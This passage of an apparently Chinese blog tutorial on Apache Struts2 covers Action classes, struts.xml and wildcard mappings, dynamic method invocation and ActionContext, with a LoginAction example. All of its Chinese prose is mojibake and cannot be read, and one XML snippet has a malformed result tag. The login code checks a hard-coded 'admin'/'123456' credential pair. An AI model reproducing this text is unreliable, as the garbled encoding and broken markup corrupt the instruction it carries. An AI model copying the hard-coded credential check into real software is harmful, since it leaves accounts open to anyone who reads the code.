class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.Action;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorldAction</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Action</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span> <span class="hljs-params">()</span><span class="hljs-keyword">throws</span> Exception</span>&#123;<br>    <span class="hljs-keyword">return</span> SUCCESS;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ–¹æ³•ä¸‰</strong>:   ç»§æ‰¿ä¸€ä¸ªæŒ‡å®šçš„çˆ¶ç±»:<code>com.opensymphony.xwork2.ActionSupport</code></p><p>   ActionSupportç±»æœ¬èº«å®ç°äº†Actionæ¥å£ï¼Œæ˜¯Struts2ä¸­é»˜è®¤çš„Actionæ¥å£çš„å®ç°ç±»ï¼Œæ‰€ä»¥ç»§æ‰¿ActionSupportå°±ç›¸å½“äºå®ç°äº†Actonæ¥å£ï¼Œå¹¶æä¾›äº†æ•°æ®çš„æ ¡éªŒã€‚</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorldAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span> <span class="hljs-params">()</span><span class="hljs-keyword">throws</span> Exception</span>&#123;<br>    <span class="hljs-keyword">return</span> SUCCESS;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>struts.xmlé…ç½®</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts2_1&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span> <br>   <span class="hljs-comment">&lt;!-- ä½¿ç”¨pjoå®Œæˆactionæ“ä½œ --&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;action1&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.Demo1Action&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>   <span class="hljs-comment">&lt;!-- å®ç°Actionç±»æ¥å®Œæˆactionæ“ä½œ --&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;action2&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.Demo2Action&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>   <span class="hljs-comment">&lt;!-- é€šè¿‡ç»§æ‰¿ActionSupportæ¥å®Œæˆactionæ“ä½œ --&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;action3&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.Demo3Action&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨å¼€å‘ä¸­ï¼Œç¬¬ä¸‰ç§æ–¹æ³•ç»å¸¸ç”¨åˆ°</p><h3 id="é€šé…ç¬¦é…ç½®Actionç±»"><a href="#é€šé…ç¬¦é…ç½®Actionç±»" class="headerlink" title="é€šé…ç¬¦é…ç½®Actionç±»"></a>é€šé…ç¬¦é…ç½®Actionç±»</h3><p>å…ˆå†™ä¸€ä¸‹å¸¸è§„å†™æ³•</p><p>æ–°å»ºä¸€ä¸ªBookActionç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span></span>&#123;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">add</span><span class="hljs-params">()</span></span>&#123;<br>System.out.println(<span class="hljs-string">&quot;Book add&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">delete</span><span class="hljs-params">()</span></span>&#123;<br>System.out.println(<span class="hljs-string">&quot;Book delete&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">update</span><span class="hljs-params">()</span></span>&#123;<br>System.out.println(<span class="hljs-string">&quot;Book update&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">find</span><span class="hljs-params">()</span></span>&#123;<br>System.out.println(<span class="hljs-string">&quot;Book find&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>book.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/FirstStruts3/book/add&quot;</span>&gt;</span>book add<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/FirstStruts3/book/delete&quot;</span>&gt;</span>book delete<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/FirstStruts3/book/update&quot;</span>&gt;</span>book update<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/FirstStruts3/book/find&quot;</span>&gt;</span>book find<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨struts.xmlé…ç½®</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts2_2&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/book&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span> <br>   <span class="hljs-comment">&lt;!--å¸¸è§„Actioné…ç½®--&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;add&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.BookAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;delete&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.BookAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;delete&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;update&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.BookAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;update&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;find&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.BookAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;find&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br></code></pre></td></tr></table></figure><p>è·‘ä¸€ä¸‹é¡¹ç›®ï¼Œéƒ½æ‰“å°å‡ºæ¥äº†<br><img src="https://img-blog.csdnimg.cn/20210326113943563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨ä½¿ç”¨struts2æ—¶ï¼Œæ¯ä¸€ä¸ªactionéƒ½éœ€è¦é…ç½®ï¼Œæ¯ä¸€ä¸ªactioné‡Œé¢çš„æ–¹æ³•ä»¥åŠå…¶è¿”å›åˆ°çš„ç•Œé¢éƒ½éœ€è¦é…ç½®ï¼Œå¦‚æœä¸€ä¸ªä¸€ä¸ªé…ç½®ï¼Œå°±å¤ªéº»çƒ¦äº†ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çº¦å®šä¸€äº›å‘½åè§„èŒƒï¼Œç„¶åå†struts.xmlé‡Œé¢ä½¿ç”¨é€šé…ç¬¦é…ç½®ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts2_2&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/book&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span> <br>   <span class="hljs-comment">&lt;!--ä½¿ç”¨é€šé…ç¬¦çš„Actioné…ç½®--&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;*&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.BookAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;&#123;1&#125;&quot;</span>&gt;</span><br>   <span class="hljs-comment">&lt;!--&#123;1&#125;ä»£è¡¨åŒ¹é…ä¸€ä¸ª*--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/20210326114605767.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="Actionçš„åŠ¨æ€æ–¹æ³•è°ƒç”¨"><a href="#Actionçš„åŠ¨æ€æ–¹æ³•è°ƒç”¨" class="headerlink" title="Actionçš„åŠ¨æ€æ–¹æ³•è°ƒç”¨"></a>Actionçš„åŠ¨æ€æ–¹æ³•è°ƒç”¨</h3><p>åœ¨å®é™…ç”Ÿæ´»ä¸­ï¼ŒActionå¤ªå¤šä¸ä¾¿ç®¡ç†ï¼Œä¸ºäº†å‡å°‘Actionï¼Œé€šå¸¸åœ¨ä¸€ä¸ªActionä¸­ç¼–å†™ä¸åŒçš„æ–¹æ³•å¤„ç†ä¸åŒçš„è¯·æ±‚ï¼Œå¦‚ç¼–å†™LoginActionï¼Œå…¶ä¸­login()æ–¹æ³•å¤„ç†ç™»é™†è¯·æ±‚ï¼Œregister()æ–¹æ³•å¤„ç†æ³¨å†Œè¯·æ±‚ï¼Œæ­¤æ—¶å¯ä»¥é‡‡ç”¨åŠ¨æ€æ–¹æ³•è°ƒç”¨æ¥å¤„ç†ã€‚</p><p>åœ¨ä½¿ç”¨åŠ¨æ€æ–¹æ³•è°ƒç”¨æ—¶ï¼Œåœ¨Actionçš„åå­—ä¸­ä½¿ç”¨<code>!</code>ç¬¦å·æ¥æ ‡è¯†è¦è°ƒç”¨æ–¹æ³•çš„åç§°ï¼Œè¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;Actionåç§°!æ–¹æ³•åç§°&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨åŠ¨æ€æ–¹æ³•è°ƒç”¨å°†è¯·æ±‚æäº¤ç»™Actionæ—¶ï¼Œè¡¨å•ä¸­çš„æ¯ä¸ªæŒ‰é’®æäº¤äº‹ä»¶éƒ½äº¤ç»™åŒä¸€ä¸ªActionï¼Œåªæ˜¯å¯¹åº”Actionä¸­çš„ä¸åŒæ–¹æ³•ã€‚åªéœ€è¦åœ¨struts.xmlä¸­åªè¦é…ç½®è¯¥Action</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Actionåå­—&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;åŒ…å.Actionç±»å&quot;</span>&gt;</span><br> &lt;result&quot;&gt;/test.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å½“å¼€å¯åŠ¨æ€æ–¹æ³•è°ƒç”¨åŠŸèƒ½æ—¶ï¼Œåº”å½“å°†ä¸‹é¢çš„å¸¸é‡ç½®ä¸ºtrue</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- åŠ¨æ€æ–¹æ³•è°ƒç”¨æ˜¯å¦å¼€å¯ï¼Œé»˜è®¤æ˜¯å…³é—­çš„ --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.enable.DynamicMethodInvocation&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constant</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸æ¨èä½¿ç”¨åŠ¨æ€æ–¹æ³•è°ƒç”¨ï¼Œå› ä¸ºä¼šå­˜åœ¨å®‰å…¨éšæ‚£ã€‚</p><h2 id="è®¿é—®Servlet-APIçš„æ–¹æ³•"><a href="#è®¿é—®Servlet-APIçš„æ–¹æ³•" class="headerlink" title="è®¿é—®Servlet APIçš„æ–¹æ³•"></a>è®¿é—®Servlet APIçš„æ–¹æ³•</h2><h3 id="é€šè¿‡ActionContextç±»è®¿é—®"><a href="#é€šè¿‡ActionContextç±»è®¿é—®" class="headerlink" title="é€šè¿‡ActionContextç±»è®¿é—®"></a>é€šè¿‡ActionContextç±»è®¿é—®</h3><p>truts2æä¾›äº†ActionContextç±»ï¼Œstruts2å¯ä»¥é€šè¿‡è¯¥ç±»æ¥å®ç°ä¸Servlet APIçš„è®¿é—®ã€‚</p><p>ActionContextç±»æä¾›äº†å¦‚ä¸‹å‡ ç§æ–¹æ³•ï¼š</p><table><thead><tr><th>æ–¹æ³•è¯´æ˜</th><th>åŠŸèƒ½æè¿°</th></tr></thead><tbody><tr><td>Object get(Object key)</td><td>ç±»ä¼¼äºè°ƒç”¨HttpServletRequestçš„getAttribute(String name)æ–¹æ³•</td></tr><tr><td>Map getApplication()</td><td>è¿”å›ä¸€ä¸ªMapå¯¹è±¡ï¼Œè¯¥å¯¹è±¡æ¨¡æ‹Ÿäº†è¯¥åº”ç”¨çš„ServletContextå®ä¾‹</td></tr><tr><td>static ActionContext getContext()</td><td>è¿™æ˜¯ä¸ªé™æ€æ–¹æ³• è·å–ç³»ç»Ÿçš„ActionContextå®ä¾‹</td></tr><tr><td>Map getParameters()</td><td>è·å–æ‰€æœ‰çš„è¯·æ±‚å‚æ•°ï¼Œç±»ä¼¼äºè°ƒç”¨HttpServletRequestå¯¹è±¡çš„getParameterMap()æ–¹æ³•</td></tr><tr><td>Map getSessionï¼ˆï¼‰</td><td>è¿”å›ä¸€ä¸ªMapå¯¹è±¡ï¼Œè¯¥å¯¹è±¡æ¨¡æ‹Ÿäº†HttpSession å®ä¾‹</td></tr><tr><td>void setApplication(Map application)</td><td>ä¼ å…¥ä¸€ä¸ªMapå®ä¾‹ï¼Œå°†Mapå®ä¾‹çš„key-valueè½¬æ¢æˆapplicationçš„å±æ€§å-å€¼ã€‚</td></tr><tr><td>void setSession(Map session)</td><td>ä¼ å…¥ä¸€ä¸ªMapå®ä¾‹ï¼Œå°†Mapå®ä¾‹çš„key-valueè½¬æ¢æˆapplicationçš„å±æ€§å-å€¼ã€‚</td></tr></tbody></table><p>å®ä¾‹1ï¼šé€šè¿‡ActionContextç±»å®ç°ç™»é™†</p><p>LoginAction.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionContext;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span></span>&#123;<br><span class="hljs-keyword">private</span> String username;<br><span class="hljs-keyword">private</span> String password;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> username;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br><span class="hljs-keyword">this</span>.username = username;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPassword</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> password;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setPassword</span><span class="hljs-params">(String password)</span> </span>&#123;<br><span class="hljs-keyword">this</span>.password = password;<br>&#125;<br>    <br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>ActionContext context=ActionContext.getContext();<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;admin&quot;</span>.equals(username)&amp;&amp;<span class="hljs-string">&quot;123456&quot;</span>.equals(password))&#123;<br>context.put(<span class="hljs-string">&quot;username&quot;</span>, username);<br>context.put(<span class="hljs-string">&quot;password&quot;</span>, password);<br>context.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-string">&quot;ç”¨æˆ·ç™»å½•æˆåŠŸï¼&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>context.put(<span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-string">&quot;ç”¨æˆ·ç™»å½•å¤±è´¥ï¼&quot;</span>);<br><span class="hljs-keyword">return</span> ERROR;<br>&#125;<br><br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span> <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;WebApp_ID&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;3.0&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>FirstStruts2<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.html<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.htm<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.html<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.htm<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--é…ç½®Struts2æ ¸å¿ƒè¿‡æ»¤å™¨--&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>struts.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 